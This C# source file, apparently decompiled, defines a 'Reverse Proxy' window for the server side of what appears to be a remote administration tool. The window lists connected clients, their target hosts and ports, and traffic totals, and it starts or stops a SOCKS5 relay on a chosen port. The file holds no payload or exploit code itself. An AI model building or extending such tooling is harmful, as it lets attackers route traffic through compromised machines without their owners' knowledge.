using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;
using Server.Helper.Sock5;

namespace Server.Forms;

public class FormReverseProxy : FormMaterial
{
	public Clients client;

	public Clients parrent;

	public Server.Helper.Sock5.Server server;

	private IContainer components;

	public RJButton rjButton1;

	public DataGridView GridIps;

	private DataGridViewTextBoxColumn ColumnClient;

	private DataGridViewTextBoxColumn ColumnTarget;

	private DataGridViewTextBoxColumn ColumnTargetPort;

	private DataGridViewTextBoxColumn ColumnTotalRecived;

	private DataGridViewTextBoxColumn ColumnTotalSent;

	private Timer timer1;

	private Panel panel1;

	public RJTextBox rjTextBox1;

	public FormReverseProxy()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void NewItem(Client client)
	{
		try
		{
			client.Tag = new DataGridViewRow();
			((DataGridViewRow)client.Tag).Tag = client;
			((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
			{
				Value = this.client.IP
			});
			((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
			{
				Value = client.IPAddress
			});
			((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
			{
				Value = client.Port
			});
			((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
			{
				Value = Methods.BytesToString(client.Recives)
			});
			((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
			{
				Value = Methods.BytesToString(client.Sents)
			});
			Invoke((MethodInvoker)delegate
			{
				GridIps.Rows.Add((DataGridViewRow)client.Tag);
			});
		}
		catch
		{
		}
	}

	private void RemoveItem(Client client)
	{
		if (client.Tag == null)
		{
			return;
		}
		try
		{
			Invoke((MethodInvoker)delegate
			{
				GridIps.Rows.Remove((DataGridViewRow)client.Tag);
			});
			((DataGridViewRow)client.Tag).Dispose();
		}
		catch
		{
		}
	}

	private void EditItem(Client client, long sent, long recive)
	{
		if (client.Tag != null)
		{
			try
			{
				((DataGridViewRow)client.Tag).Cells[0].Value = this.client.IP;
				((DataGridViewRow)client.Tag).Cells[1].Value = client.IPAddress;
				((DataGridViewRow)client.Tag).Cells[2].Value = client.Port;
				((DataGridViewRow)client.Tag).Cells[3].Value = Methods.BytesToString(client.Recives);
				((DataGridViewRow)client.Tag).Cells[4].Value = Methods.BytesToString(client.Sents);
			}
			catch
			{
			}
		}
	}

	private void RemoteDesktop_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
	}

	public void Activea()
	{
		server.ConnectEvent += NewItem;
		server.DisconnectEvent += RemoveItem;
		server.ResponceEvent += EditItem;
	}

	private void ChangeScheme(object sender)
	{
		GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		rjButton1.BackColor = FormMaterial.PrimaryColor;
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		if (rjButton1.Text == "Start")
		{
			try
			{
				Convert.ToInt32(rjTextBox1.Texts);
			}
			catch
			{
				return;
			}
			server.Start(Convert.ToInt32(rjTextBox1.Texts));
			rjButton1.Text = "Stop";
		}
		else
		{
			server.Stop();
			rjButton1.Text = "Start";
		}
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
		server.Stop();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager componentResourceManager = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormReverseProxy));
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.GridIps = new System.Windows.Forms.DataGridView();
		this.ColumnClient = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnTarget = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnTargetPort = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnTotalRecived = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnTotalSent = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		((System.ComponentModel.ISupportInitialize)this.GridIps).BeginInit();
		base.SuspendLayout();
		this.rjTextBox1.BackColor = System.Drawing.Color.White;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Enabled = false;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox1.Location = new System.Drawing.Point(7, 69);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Port";
		this.rjTextBox1.Size = new System.Drawing.Size(92, 28);
		this.rjTextBox1.TabIndex = 2;
		this.rjTextBox1.Texts = "4680";
		this.rjTextBox1.UnderlinedStyle = false;
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.Enabled = false;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(106, 69);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 27);
		this.rjButton1.TabIndex = 3;
		this.rjButton1.Text = "Start";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.GridIps.AllowUserToAddRows = false;
		this.GridIps.AllowUserToDeleteRows = false;
		this.GridIps.AllowUserToResizeColumns = false;
		this.GridIps.AllowUserToResizeRows = false;
		this.GridIps.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.GridIps.BackgroundColor = System.Drawing.Color.White;
		this.GridIps.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridIps.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridIps.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.GridIps.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridIps.Columns.AddRange(this.ColumnClient, this.ColumnTarget, this.ColumnTargetPort, this.ColumnTotalRecived, this.ColumnTotalSent);
		this.GridIps.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridIps.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridIps.Enabled = false;
		this.GridIps.EnableHeadersVisualStyles = false;
		this.GridIps.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridIps.Location = new System.Drawing.Point(6, 104);
		this.GridIps.Name = "GridIps";
		this.GridIps.ReadOnly = true;
		this.GridIps.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridIps.RowHeadersVisible = false;
		this.GridIps.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridIps.ShowCellErrors = false;
		this.GridIps.ShowCellToolTips = false;
		this.GridIps.ShowEditingIcon = false;
		this.GridIps.ShowRowErrors = false;
		this.GridIps.Size = new System.Drawing.Size(547, 333);
		this.GridIps.TabIndex = 14;
		this.ColumnClient.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnClient.HeaderText = "Client";
		this.ColumnClient.MinimumWidth = 80;
		this.ColumnClient.Name = "ColumnClient";
		this.ColumnClient.ReadOnly = true;
		this.ColumnClient.Width = 80;
		this.ColumnTarget.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnTarget.HeaderText = "Target";
		this.ColumnTarget.MinimumWidth = 80;
		this.ColumnTarget.Name = "ColumnTarget";
		this.ColumnTarget.ReadOnly = true;
		this.ColumnTarget.Width = 80;
		this.ColumnTargetPort.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnTargetPort.HeaderText = "Target Port";
		this.ColumnTargetPort.MinimumWidth = 120;
		this.ColumnTargetPort.Name = "ColumnTargetPort";
		this.ColumnTargetPort.ReadOnly = true;
		this.ColumnTargetPort.Width = 120;
		this.ColumnTotalRecived.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnTotalRecived.HeaderText = "Total Recived";
		this.ColumnTotalRecived.MinimumWidth = 120;
		this.ColumnTotalRecived.Name = "ColumnTotalRecived";
		this.ColumnTotalRecived.ReadOnly = true;
		this.ColumnTotalRecived.Width = 120;
		this.ColumnTotalSent.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnTotalSent.HeaderText = "Total Sent";
		this.ColumnTotalSent.Name = "ColumnTotalSent";
		this.ColumnTotalSent.ReadOnly = true;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(554, 376);
		this.panel1.TabIndex = 15;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(560, 443);
		base.Controls.Add(this.GridIps);
		base.Controls.Add(this.rjTextBox1);
		base.Controls.Add(this.rjButton1);
		base.Controls.Add(this.panel1);
		base.Icon = (System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
		this.MinimumSize = new System.Drawing.Size(560, 443);
		base.Name = "FormReverseProxy";
		this.Text = "Reverse Proxy";
		base.Load += new System.EventHandler(RemoteDesktop_Load);
		((System.ComponentModel.ISupportInitialize)this.GridIps).EndInit();
		base.ResumeLayout(false);
	}
}
